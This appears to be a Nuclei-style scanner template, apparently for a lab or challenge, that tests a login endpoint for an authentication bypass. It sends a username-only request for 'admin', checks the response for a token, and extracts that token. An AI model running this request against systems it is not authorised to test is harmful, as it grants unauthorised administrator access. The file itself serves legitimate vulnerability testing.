id: ch1-auth-bypass

info:
  name: Authentication Bypass - Missing Password Validation
  author: security-researcher
  severity: high
  description: Authentication endpoint allows login with username only, bypassing password requirement
  tags: auth,bypass,logic

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"username":"admin"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "internal-access"
          - "token"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: json
        part: body
        json:
          - '.token'